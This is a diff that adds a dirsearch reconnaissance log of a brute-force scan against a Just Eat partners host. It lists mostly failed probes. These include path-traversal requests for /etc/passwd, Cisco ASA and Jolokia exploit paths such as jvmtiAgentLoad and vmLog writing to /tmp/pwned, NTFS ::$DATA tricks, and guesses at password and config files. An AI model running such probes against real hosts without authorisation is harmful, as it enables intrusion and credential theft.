@@ -1,0 +1,111 @@
+# Dirsearch started Mon Nov 17 10:01:42 2025 as: /usr/local/bin/dirsearch -u https://cloud.partners.just-eat.co.uk/
+
+403   312B   https://cloud.partners.just-eat.co.uk/%2e%2e//google.com
+302   153B   https://cloud.partners.just-eat.co.uk/%3f/    -> REDIRECTS TO: /GenericError.aspx?aspxerrorpath=/?/
+404     1KB  https://cloud.partners.just-eat.co.uk/+CSCOE+/logon.html
+404     1KB  https://cloud.partners.just-eat.co.uk/+CSCOE+/session_password.html
+404     1KB  https://cloud.partners.just-eat.co.uk/+CSCOT+/oem
+404     1KB  https://cloud.partners.just-eat.co.uk/+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/portal_inc.lua&default-language&lang=../
+404     1KB  https://cloud.partners.just-eat.co.uk/+CSCOT+/translation
+404     1KB  https://cloud.partners.just-eat.co.uk/+CSCOT+/oem-customization?app=AnyConnect&type=oem&platform=..&resource-type=..&name=%2bCSCOE%2b/portal_inc.lua
+403   312B   https://cloud.partners.just-eat.co.uk/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
+404     1KB  https://cloud.partners.just-eat.co.uk/.asa
+404     1KB  https://cloud.partners.just-eat.co.uk/.config
+404     1KB  https://cloud.partners.just-eat.co.uk/.config/psi+/profiles/default/accounts.xml
+404     1KB  https://cloud.partners.just-eat.co.uk/.mdb
+404     1KB  https://cloud.partners.just-eat.co.uk/.nuget/packages.config
+403   312B   https://cloud.partners.just-eat.co.uk/\..\..\..\..\..\..\..\..\..\etc\passwd
+302   157B   https://cloud.partners.just-eat.co.uk/admin.    -> REDIRECTS TO: /GenericError.aspx?aspxerrorpath=/admin.
+404     1KB  https://cloud.partners.just-eat.co.uk/admin.mdb
+404     1KB  https://cloud.partners.just-eat.co.uk/admin/.config
+404     1KB  https://cloud.partners.just-eat.co.uk/app.config
+404     1KB  https://cloud.partners.just-eat.co.uk/app/bin
+404     1KB  https://cloud.partners.just-eat.co.uk/App_Code
+404     1KB  https://cloud.partners.just-eat.co.uk/app_code
+404     1KB  https://cloud.partners.just-eat.co.uk/App_Data
+404     1KB  https://cloud.partners.just-eat.co.uk/app_data
+302   158B   https://cloud.partners.just-eat.co.uk/asset..    -> REDIRECTS TO: /GenericError.aspx?aspxerrorpath=/asset..
+404     1KB  https://cloud.partners.just-eat.co.uk/authorization.config
+404     1KB  https://cloud.partners.just-eat.co.uk/bin
+404     1KB  https://cloud.partners.just-eat.co.uk/bin/reset-db-prod.sh
+404     1KB  https://cloud.partners.just-eat.co.uk/bin/libs
+404     1KB  https://cloud.partners.just-eat.co.uk/bin/
+404     1KB  https://cloud.partners.just-eat.co.uk/bin/config.sh
+404     1KB  https://cloud.partners.just-eat.co.uk/bin/hostname
+404     1KB  https://cloud.partners.just-eat.co.uk/bin/reset-db.sh
+404     1KB  https://cloud.partners.just-eat.co.uk/bin/RhoBundle
+404     1KB  https://cloud.partners.just-eat.co.uk/bin/tmp
+404     1KB  https://cloud.partners.just-eat.co.uk/bin/target
+404     1KB  https://cloud.partners.just-eat.co.uk/bitrix/authorization.config
+404     1KB  https://cloud.partners.just-eat.co.uk/bitrix/web.config
+404     1KB  https://cloud.partners.just-eat.co.uk/cabal.sandbox.config
+403   312B   https://cloud.partners.just-eat.co.uk/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
+404     1KB  https://cloud.partners.just-eat.co.uk/clients.mdb
+404     1KB  https://cloud.partners.just-eat.co.uk/cms.csproj
+404     1KB  https://cloud.partners.just-eat.co.uk/cms/Web.config
+404     1KB  https://cloud.partners.just-eat.co.uk/cms/components/login.ascx
+404     1KB  https://cloud.partners.just-eat.co.uk/cms/cms.csproj
+404     1KB  https://cloud.partners.just-eat.co.uk/components/login.ascx
+404     1KB  https://cloud.partners.just-eat.co.uk/config/AppData.config
+404     1KB  https://cloud.partners.just-eat.co.uk/Configs/authServerSettings.config
+404     1KB  https://cloud.partners.just-eat.co.uk/Configs/Current/authServerSettings.config
+404     1KB  https://cloud.partners.just-eat.co.uk/customers.mdb
+404     1KB  https://cloud.partners.just-eat.co.uk/data.mdb
+404     1KB  https://cloud.partners.just-eat.co.uk/database.mdb
+404     1KB  https://cloud.partners.just-eat.co.uk/db.mdb
+404     1KB  https://cloud.partners.just-eat.co.uk/db/main.mdb
+404     1KB  https://cloud.partners.just-eat.co.uk/db1.mdb
+302   228B   https://cloud.partners.just-eat.co.uk/docpicker/internal_proxy/https/127.0.0.1:9043/ibm/console    -> REDIRECTS TO: /GenericError.aspx?aspxerrorpath=/docpicker/internal_proxy/https/127.0.0.1:9043/ibm/console
+404     1KB  https://cloud.partners.just-eat.co.uk/examples/jsp/%252e%252e/%252e%252e/manager/html/
+404     1KB  https://cloud.partners.just-eat.co.uk/global.asa
+404     1KB  https://cloud.partners.just-eat.co.uk/global.asax
+404     1KB  https://cloud.partners.just-eat.co.uk/hTTgS.mdb
+404     1KB  https://cloud.partners.just-eat.co.uk/index.cs
+404     1KB  https://cloud.partners.just-eat.co.uk/index.java
+302   161B   https://cloud.partners.just-eat.co.uk/index.php.    -> REDIRECTS TO: /GenericError.aspx?aspxerrorpath=/index.php.
+302   181B   https://cloud.partners.just-eat.co.uk/index.php::$DATA    -> REDIRECTS TO: /GenericError.aspx?aspxerrorpath=/index.php::$DATA
+404     1KB  https://cloud.partners.just-eat.co.uk/index.vb
+302   175B   https://cloud.partners.just-eat.co.uk/javax.faces.resource.../    -> REDIRECTS TO: /GenericError.aspx?aspxerrorpath=/javax.faces.resource.../
+302   194B   https://cloud.partners.just-eat.co.uk/javax.faces.resource.../WEB-INF/web.xml.jsf    -> REDIRECTS TO: /GenericError.aspx?aspxerrorpath=/javax.faces.resource.../WEB-INF/web.xml.jsf
+302   239B   https://cloud.partners.just-eat.co.uk/jolokia/exec/com.sun.management:type=DiagnosticCommand/vmLog/disable    -> REDIRECTS TO: /GenericError.aspx?aspxerrorpath=/jolokia/exec/com.sun.management:type=DiagnosticCommand/vmLog/disable
+302   258B   https://cloud.partners.just-eat.co.uk/jolokia/exec/com.sun.management:type=DiagnosticCommand/jvmtiAgentLoad/!/etc!/passwd    -> REDIRECTS TO: /GenericError.aspx?aspxerrorpath=/jolokia/exec/com.sun.management:type=DiagnosticCommand/jvmtiAgentLoad/!/etc!/passwd
+302   260B   https://cloud.partners.just-eat.co.uk/jolokia/exec/com.sun.management:type=DiagnosticCommand/jfrStart/filename=!/tmp!/foo    -> REDIRECTS TO: /GenericError.aspx?aspxerrorpath=/jolokia/exec/com.sun.management:type=DiagnosticCommand/jfrStart/filename=!/tmp!/foo
+302   257B   https://cloud.partners.just-eat.co.uk/jolokia/exec/com.sun.management:type=DiagnosticCommand/vmLog/output=!/tmp!/pwned    -> REDIRECTS TO: /GenericError.aspx?aspxerrorpath=/jolokia/exec/com.sun.management:type=DiagnosticCommand/vmLog/output=!/tmp!/pwned
+302   242B   https://cloud.partners.just-eat.co.uk/jolokia/exec/com.sun.management:type=DiagnosticCommand/vmSystemProperties    -> REDIRECTS TO: /GenericError.aspx?aspxerrorpath=/jolokia/exec/com.sun.management:type=DiagnosticCommand/vmSystemProperties
+302   232B   https://cloud.partners.just-eat.co.uk/jolokia/exec/com.sun.management:type=DiagnosticCommand/help/*    -> REDIRECTS TO: /GenericError.aspx?aspxerrorpath=/jolokia/exec/com.sun.management:type=DiagnosticCommand/help/*
+302   206B   https://cloud.partners.just-eat.co.uk/jolokia/exec/java.lang:type=Memory/gc    -> REDIRECTS TO: /GenericError.aspx?aspxerrorpath=/jolokia/exec/java.lang:type=Memory/gc
+302   265B   https://cloud.partners.just-eat.co.uk/jolokia/exec/com.sun.management:type=DiagnosticCommand/compilerDirectivesAdd/!/etc!/passwd    -> REDIRECTS TO: /GenericError.aspx?aspxerrorpath=/jolokia/exec/com.sun.management:type=DiagnosticCommand/compilerDirectivesAdd/!/etc!/passwd
+302   214B   https://cloud.partners.just-eat.co.uk/jolokia/read/java.lang:type=*/HeapMemoryUsage    -> REDIRECTS TO: /GenericError.aspx?aspxerrorpath=/jolokia/read/java.lang:type=*/HeapMemoryUsage
+302   207B   https://cloud.partners.just-eat.co.uk/jolokia/search/*:j2eeType=J2EEServer,*    -> REDIRECTS TO: /GenericError.aspx?aspxerrorpath=/jolokia/search/*:j2eeType=J2EEServer,*
+302   226B   https://cloud.partners.just-eat.co.uk/jolokia/read/java.lang:type=Memory/HeapMemoryUsage/used    -> REDIRECTS TO: /GenericError.aspx?aspxerrorpath=/jolokia/read/java.lang:type=Memory/HeapMemoryUsage/used
+302   219B   https://cloud.partners.just-eat.co.uk/jolokia/write/java.lang:type=Memory/Verbose/true    -> REDIRECTS TO: /GenericError.aspx?aspxerrorpath=/jolokia/write/java.lang:type=Memory/Verbose/true
+404     1KB  https://cloud.partners.just-eat.co.uk/lang/web.config
+404     1KB  https://cloud.partners.just-eat.co.uk/log.mdb
+302   161B   https://cloud.partners.just-eat.co.uk/login.wdm%2e    -> REDIRECTS TO: /GenericError.aspx?aspxerrorpath=/login.wdm.
+302   160B   https://cloud.partners.just-eat.co.uk/login.wdm%20    -> REDIRECTS TO: /GenericError.aspx?aspxerrorpath=/login.wdm
+404     1KB  https://cloud.partners.just-eat.co.uk/logs.mdb
+404     1KB  https://cloud.partners.just-eat.co.uk/main.mdb
+404     1KB  https://cloud.partners.just-eat.co.uk/members.mdb
+404     1KB  https://cloud.partners.just-eat.co.uk/modules/web.config
+404     1KB  https://cloud.partners.just-eat.co.uk/orleans.codegen.cs
+404     1KB  https://cloud.partners.just-eat.co.uk/password.mdb
+404     1KB  https://cloud.partners.just-eat.co.uk/passwords.mdb
+404     1KB  https://cloud.partners.just-eat.co.uk/personal.mdb
+404     1KB  https://cloud.partners.just-eat.co.uk/plugins/web.config
+200   546B   https://cloud.partners.just-eat.co.uk/post.html
+404     1KB  https://cloud.partners.just-eat.co.uk/private.mdb
+302   163B   https://cloud.partners.just-eat.co.uk/rating_over.    -> REDIRECTS TO: /GenericError.aspx?aspxerrorpath=/rating_over.
+404     1KB  https://cloud.partners.just-eat.co.uk/servlet/WebSphereSamples.Configuration.config
+302   159B   https://cloud.partners.just-eat.co.uk/static..    -> REDIRECTS TO: /GenericError.aspx?aspxerrorpath=/static..
+404     1KB  https://cloud.partners.just-eat.co.uk/test.mdb
+302   181B   https://cloud.partners.just-eat.co.uk/Trace.axd::$DATA    -> REDIRECTS TO: /GenericError.aspx?aspxerrorpath=/Trace.axd::$DATA
+404     1KB  https://cloud.partners.just-eat.co.uk/typo3conf/ext/static_info_tables/ext_tables_static+adt.sql
+404     1KB  https://cloud.partners.just-eat.co.uk/typo3conf/ext/static_info_tables/ext_tables_static+adt-orig.sql
+404     1KB  https://cloud.partners.just-eat.co.uk/users.mdb
+302   167B   https://cloud.partners.just-eat.co.uk/WEB-INF./web.xml    -> REDIRECTS TO: /GenericError.aspx?aspxerrorpath=/WEB-INF./web.xml
+302   160B   https://cloud.partners.just-eat.co.uk/WEB-INF./    -> REDIRECTS TO: /GenericError.aspx?aspxerrorpath=/WEB-INF./
+404     1KB  https://cloud.partners.just-eat.co.uk/web.config
+404     1KB  https://cloud.partners.just-eat.co.uk/web.Debug.config
+302   182B   https://cloud.partners.just-eat.co.uk/web.config::$DATA    -> REDIRECTS TO: /GenericError.aspx?aspxerrorpath=/web.config::$DATA
+404     1KB  https://cloud.partners.just-eat.co.uk/web.Release.config
+404     1KB  https://cloud.partners.just-eat.co.uk/WebSphereSamples.Configuration.config
